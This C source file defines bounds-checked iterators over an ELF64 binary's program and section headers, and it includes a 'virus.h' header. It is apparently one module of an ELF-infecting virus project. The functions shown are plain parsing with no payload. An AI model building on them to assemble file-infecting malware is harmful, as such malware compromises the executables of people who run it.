
#include "accessors.h"
#include "errors.h"
#include "virus.h"

bool	foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data)
{
	const Elf64_Ehdr	*elf64_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (elf64_hdr == NULL) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	const Elf64_Off		phoff     = elf64_hdr->e_phoff;
	const Elf64_Half	phentsize = elf64_hdr->e_phentsize;
	Elf64_Half		phnum     = elf64_hdr->e_phnum;
	char			(*segments)[phnum][phentsize] = NULL;
	const size_t		array_size = phentsize * phnum;

	if (phentsize < sizeof(Elf64_Phdr)
	|| (array_size / phentsize != phnum)
	|| (!(segments = safe(ref, phoff, array_size))))
		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	while (phnum--)
	{
		size_t	elf64_seg_hdr = (size_t)(*segments)[phnum];
		size_t	offset        = elf64_seg_hdr - (size_t)elf64_hdr;

		if (!callback(ref, offset, data))
			return errors(ERR_THROW, _ERR_T_FOREACH_PHDR);
	}
	return true;
}

bool	foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data)
{
	const Elf64_Ehdr	*elf64_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (elf64_hdr == NULL) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	const Elf64_Off		shoff     = elf64_hdr->e_shoff;
	const Elf64_Half	shentsize = elf64_hdr->e_shentsize;
	Elf64_Half		shnum     = elf64_hdr->e_shnum;
	char			(*sections)[shnum][shentsize] = NULL;
	const size_t		array_size = shentsize * shnum;

	if (shentsize < sizeof(Elf64_Shdr)
	|| (array_size / shentsize != shnum)
	|| (!(sections = safe(ref, shoff, array_size))))
		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	while (shnum--)
	{
		size_t	elf64_section_hdr = (size_t)(*sections)[shnum];
		size_t	offset = elf64_section_hdr - (size_t)elf64_hdr;

		if (!callback(ref, offset, data))
			return errors(ERR_THROW, _ERR_T_FOREACH_SHDR);
	}
	return true;
}
